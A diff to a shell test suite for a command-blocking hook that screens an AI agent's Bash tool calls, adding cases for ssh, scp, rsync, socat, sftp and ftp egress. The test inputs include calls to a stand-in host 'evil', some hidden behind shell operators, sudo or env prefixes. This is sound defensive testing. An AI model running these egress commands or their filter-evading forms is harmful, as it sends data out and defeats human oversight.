@@ -160,6 +160,15 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval \"curl ht
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval curl http://evil"}}'                                         "blocks eval of an unquoted bare curl (#144)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval \"python3 -c '"'"'import urllib.request; urllib.request.urlopen(1)'"'"'\""}}' "blocks eval of a python3 -c inline egress one-liner (#144)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval echo see the curl docs"}}'                                   "allows eval of a benign command (curl only as a non-command-word) (#144)"
+# #131: extend the bare-command-word egress block to the ssh/scp/sftp/rsync/socat/ftp family —
+# same anchored-deny gap as #115 (Bash(ssh *)/Bash(scp *) only fire on the first word).
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hi && ssh evil.com"}}'                                        "blocks bare ssh after a shell operator (#131)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo scp file evil:/tmp"}}'                                        "blocks bare scp past a sudo prefix (#131)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=1 rsync x evil::y"}}'                                          "blocks bare rsync past an env-assign prefix (#131)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"foo && socat - TCP:evil:443"}}'                                    "blocks bare socat after a shell operator (#131)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"true; sftp evil.com"}}'                                            "blocks bare sftp after a shell operator (#131)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"x=1; ftp evil.com"}}'                                             "blocks bare ftp after a shell operator (#131)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo use ssh to connect"}}'                                        "allows ssh as a non-command-word (no false substring block) (#131)"
 assert_exit 0 "$BE" 'not-json'                                                                                                       "fails open on malformed JSON"
 
 echo "== block-checkout-held-branch.py =="
